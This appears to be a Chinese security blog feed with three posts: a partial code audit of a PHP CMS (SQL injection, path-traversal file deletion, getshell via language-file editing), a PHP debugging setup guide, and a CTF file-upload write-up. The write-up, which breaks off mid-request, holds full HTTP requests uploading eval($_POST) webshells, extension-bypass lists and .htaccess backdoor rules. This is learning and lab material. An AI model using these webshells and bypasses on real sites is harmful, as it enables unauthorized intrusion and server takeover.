class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;对不起，用户名和密码不能为空&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;返回重新登录&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     ……</span><br></pre></td></tr></table></figure><h3 id="user-登录"><a href="#user-登录" class="headerlink" title="user 登录"></a>user 登录</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以看到，基本都经过了带有过滤的函数处理。所以像，SQL注入和XSS 这种需要构造特殊符号的漏洞几乎很难了</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>基于功能点去测，先高危后低危。后台一般防御较弱，从后台突破较容易。而后台存在的功能有：图片、文件、模板管理、删除、留言审核，等其他功能。</p><h2 id="前台搜索框SQL-注入"><a href="#前台搜索框SQL-注入" class="headerlink" title="前台搜索框SQL 注入"></a>前台搜索框SQL 注入</h2><p>开启MySQL 监控，然后再搜索框进行搜索。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>如图，123，被带入SQL语句进行查询，单引号闭合。将关键字在整个文件夹中搜索：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>这里先rawurldecode 解码，然后带入拼接进入查询。</p><p>然后下断点进行分析：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>直接上sqlmap。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="后台任意文件删除漏洞"><a href="#后台任意文件删除漏洞" class="headerlink" title="后台任意文件删除漏洞"></a>后台任意文件删除漏洞</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>此处采用了白名单的形式，只能删除 指定的三个目录下的文件。但是忽略了可以用<code>../</code>来绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr 从第<code>$path</code>的第一个字母开始往后判断，截取path前半部分长度和白名单是否相等，即是否是白名单里的那几个目录，是，然后<code>unlink</code>删除掉。</p><p>成功删除文件时，返回1。</p><p>这里我遇到了一个问题，就是这个域名是通过MAMP修改的本地HOSTS文件解析的，然后找到了一篇文章，<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0，简单设置一下就可以了。</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="漏洞演示"></p><h2 id="后台编辑语言文件设置GetShell"><a href="#后台编辑语言文件设置GetShell" class="headerlink" title="后台编辑语言文件设置GetShell"></a>后台编辑语言文件设置GetShell</h2><p>成功编辑后，回显 编辑语言包成功。那么在整个文件中搜索即可定位到代码。<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;编辑语言包成功&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;返回上一页&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该函数中，经过<code>post()</code> 函数过滤，但是对于<code>$lang_text</code> 的过滤规则是<code>no_filter</code> ，跟进查看一下该规则。</p><p>/include/function.php,104行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// 删除反斜杠</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有过滤 <code>$lang_text</code> 就通过<code>file_put_contents</code> 写入文件，那么这里就可以写WebShell。</p><p>同样的，下断点来调试分析。</p><p>step into ，慢慢点，可以看到这里没有任何过滤，写入webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> 可控的，这里只需要把<code>$path</code> 改为一个<code>.php</code> 后缀的就可以GetShell 了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="审计总结"><a href="#审计总结" class="headerlink" title="审计总结"></a>审计总结</h1><p>基本上是照搬照抄别人的思路来搞的，总比躺着玩手机强，也遇到了一些问题，比如Burp Suite 设置 域名和ip 绑定，phpstorm 调试分析，总之，能学到东西就行。学到了思路，下一步就是复现thinkphp 的历史漏洞，和thinkcmf 或者其他php框架的历史漏洞，学习完之后就去找cms进行实战！（其实这个已经搁置了快半年了。</p><blockquote><p>一个不能孜孜不倦，始终处于新知识、新技术学习状态下的安全爱好者，必然会被超越和取代。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;代码审计常见的三种方法（PHP篇）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="漏洞挖掘" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 下配置PHP代码审计环境，PHP调试学习</title>
    <link href="https://hack-for.fun/4fd81e40.html"/>
    <id>https://hack-for.fun/4fd81e40.html</id>
    <published>2020-09-11T12:34:13.000Z</published>
    <updated>2020-09-11T15:56:23.844Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境配置参考文章：<a href="https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2">https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2</a></p><blockquote><p>所需App：</p><p>MAMP PRO ，我是在Google 里找的Cracked Version</p><p>PHPStorm / Vscode</p></blockquote><p>MAMP 中的 <code>php.ini</code> 设置</p><p>在切换php版本时需添加如下内容，免得debug 环境出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable&#x3D;1</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_autostart&#x3D;1</span><br><span class="line">xdebug.profiler_enable&#x3D;0</span><br><span class="line">xdebug.profiler_output_dir&#x3D;&quot;&#x2F;Applications&#x2F;MAMP&#x2F;tmp&quot;</span><br><span class="line">xdebug.idekey&#x3D;&quot;my_key&quot;</span><br></pre></td></tr></table></figure><p>出现下图的情况，说明Debug 配置正常。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911203443.png" alt="image-20200911203438853"></p><hr><blockquote><p>推荐将整个代码审计的路径设置成Project, 比如:  xxx/www/xxx</p><p>然后MAMP 和 PhpStorm 的设置要一致。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222248.png" alt="image-20200911204652392"></p><h1 id="单个文件调试"><a href="#单个文件调试" class="headerlink" title="单个文件调试"></a>单个文件调试</h1><p>测试Debug 是否成功：在第四行，变量字符串拼接的地方，下个断点进行调试。结果如图。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222425.png" alt="image-20200911205830698"></p><h1 id="整个文件夹-网站目录-调试"><a href="#整个文件夹-网站目录-调试" class="headerlink" title="整个文件夹(网站目录)调试"></a>整个文件夹(网站目录)调试</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222559.png" alt="image-20200911210726371"></p><blockquote><p>关键是选择下面的Server 即可。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222713.png" alt="image-20200911210857642"></p><p>PHPMyadmin 需要php  5.5+ , cms 安装时，数据库在phpmyadmin 中创建即可。</p><p>这里以国光师傅文章的cms，后台语言设置GetShell，来测试。</p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36">https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36</a></p><p>在 149 行下断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222146.png"></p><p>可直接在<code>$lang_text</code> 中修改值即可进行调试。</p><p>Burp Suite 抓包的请求包：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222725.png" alt="image-20200911220557034"></p><h1 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222737.png" alt="image-20200911213334993"></p><h1 id="MySQL-监控"><a href="#MySQL-监控" class="headerlink" title="MySQL 监控"></a>MySQL 监控</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222752.png" alt="image-20200911214143396"></p><p>需要修改<code>config.ini</code> 中的数据库为之前cms 创建的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[dbconf]</span><br><span class="line">host&#x3D;localhost</span><br><span class="line">port&#x3D;8889</span><br><span class="line">user&#x3D;root</span><br><span class="line">password&#x3D;root</span><br><span class="line">db_name&#x3D;test</span><br><span class="line">charset&#x3D;utf8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222811.png" alt="image-20200911214903921"></p><p>使用DataGrip 连接MySQL 时的监控日志</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223609.png" alt="image-20200911215237610"></p><h2 id="DataGrip-连接数据库"><a href="#DataGrip-连接数据库" class="headerlink" title="DataGrip 连接数据库"></a>DataGrip 连接数据库</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222823.png" alt="image-20200911215449398"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223553.png" alt="image-20200911215526972"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223540.png" alt="image-20200911215342544"></p><h1 id="VsCode-配置"><a href="#VsCode-配置" class="headerlink" title="VsCode 配置"></a>VsCode 配置</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911234844.png" alt="image-20200911234023142"></p><p>VScode 单步调试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911235149.png" alt="image-20200911233946444"></p><p>终于会调试了~ </p><p>下一步就是去完整代码审计一下这个CMS~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;环境配置参考文章：&lt;a href=&quot;https://www.sqlsec.com/2020/07/</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTF - 文件上传</title>
    <link href="https://hack-for.fun/103ec22a.html"/>
    <id>https://hack-for.fun/103ec22a.html</id>
    <published>2020-08-30T13:01:05.000Z</published>
    <updated>2020-08-31T02:25:04.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞技术点"><a href="#文件上传漏洞技术点" class="headerlink" title="文件上传漏洞技术点"></a>文件上传漏洞技术点</h1><blockquote><p>参考资料：<a href="http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/">http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/</a></p></blockquote><p>CheckFile 分为C前端和S后端：</p><ul><li>前端绕过直接BP 抓包就可以了 、或者在浏览器的Console 里将CheckFile() 函数置空（相当于删除。</li><li>后端检测主要针对文件后缀，文件内容，以及Content-Type，MIMI-Type ，较难的有二次渲染，数组绕过，通过修改配置文件绕过，畸形解析。</li></ul><h2 id="可解析后缀"><a href="#可解析后缀" class="headerlink" title="可解析后缀"></a>可解析后缀</h2><p>CTF文件上传题中常用的php拓展名:</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200830214608.png" alt="image-20200830213958438"></p><ul><li>利用中间件解析漏洞绕过检查，实战常用</li><li>上传.user.ini或.htaccess将合法拓展名文件当作php文件解析（ <strong>.user.ini 适用性更广</strong>，后者只能用于Apache</li></ul><blockquote><p>.user.ini  和 .htaccess 中的小技巧</p><p><code>\</code> 可用于换行，常常出现在一些非预期中。</p><p>还可以通过重写这两个文件改变编码(UTF-7)来绕过，较复杂。</p><p>.htaccess 中 <code>#</code> 可用于注释。</p><p>文件包含<code>.htaccess</code> 读取配置，然后访问其中的链接。</p></blockquote><ul><li>%00截断绕过</li><li>php3</li><li>php4</li><li>php5</li><li>php7</li><li>phtml</li><li>phps</li><li>pht</li><li>Windows ADS流特性 ::$DATA</li><li>Windows 文件名特性，后缀后加空格，加其他字符。</li></ul><h2 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h2><ul><li>Windows下文件名不区分大小写，Linux下文件名区分</li><li>Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php</li><li>Windows下文件名结尾加入<code>.</code>,<code>空格</code>,<code>&lt;</code>,·<code>&gt;</code>,<code>&gt;&gt;&gt;</code>,<code>0x81-0xff</code>等字符，最终生成的文件均被windows忽略。</li></ul><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><ul><li>iis</li></ul><p>iis一共有三个解析漏洞：</p><p>1.IIS6.0文件解析 xx.asp;.jpg<br>2.IIS6.0目录解析 xx.asp/1.jpg<br>3.IIS 7.0畸形解析 xxx.jpg/x.asp</p><ul><li>apache</li></ul><ol><li>%0a(CVE-2017-15715)</li><li>未知后缀 test.php.xxx</li></ol><ul><li>nginx</li></ul><ol><li>访问连接加/xxx.php test.jpg/xxx.php</li><li>畸形解析漏洞 test.jpg%00xxx.php</li><li>CVE-2013-4547 test.jpg(非编码空格)\0x.php</li></ol><ul><li>tomcat</li></ul><p>tomcat用于上传绕过的有三种,不过限制在windows操作系统下。</p><ol><li>xxx.jsp/</li><li>xxx.jsp%20</li><li>xxx.jsp::$DATA</li></ol><h2 id="框架特性、程序逻辑"><a href="#框架特性、程序逻辑" class="headerlink" title="框架特性、程序逻辑"></a>框架特性、程序逻辑</h2><p>比如：</p><ul><li><p>ThinkPHP 的多文件上传逻辑</p></li><li><p>程序逻辑：大胆尝试。（有些是函数使用不严格，导致了绕过</p></li><li><p>条件竞争</p></li></ul><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>技术点：</p><ul><li>JS绕过对&lt;?php 的检测</li><li>Content-Type 绕过</li><li>常见可解析后缀bypass</li></ul><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload_file.php HTTP&#x2F;1.1</span><br><span class="line">Host: 77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn</span><br><span class="line">Content-Length: 354</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;77ae3ce4-3fb3-4a06-9fc8-f986cc7b3b5a.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;basic_php_webshell.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[A]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryeK0id0O3p4ekLat6--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Webshell 地址：url/upload/webshell.php  连接密码为A。</p><p>获取flag：虚拟终端执行 <code>cat /flag</code></p><p>后端伪代码可能为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/&lt;?/i&#x27;</span>,flie_get_contents($upload_file));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no &lt;?&quot;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/|php|pht|phtm|...|/i&#x27;</span>,file_extension);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>技术点：</p><ul><li>前端校验bypass（通过BurpSuite 抓包</li><li>常见可解析后缀bypass</li></ul><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn</span><br><span class="line">Content-Length: 338</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.135 Safari&#x2F;537.36 Edg&#x2F;84.0.522.63</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;7f8fc00a-bb3c-4388-9b8d-d0fcdecd632c.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;basic_php_webshell.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">------WebKitFormBoundary4TEVfSl48M3KTzel--</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>技术点：</p><ul><li>.htaccess 重写绕过黑名单解析GetShell</li><li>Content-Type Bypass</li><li>&lt;? Bypass</li></ul><p>上传.htaccess</p><ul><li>使 <code>png</code> 文件解析为<code>php</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType  application&#x2F;x-httpd-php    .png</span><br></pre></td></tr></table></figure><ul><li>将所有文件解析为<code>php</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><ul><li><code>.htaccess</code>留后门，添加php解析规则，文件名包含1则解析为php</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn</span><br><span class="line">Content-Length: 359</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;1b930c8d-beda-47e3-ba7c-85bc358075d3.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryWrINBQvOPdxaBJwJ</span><br><span class="line">User-Agent: 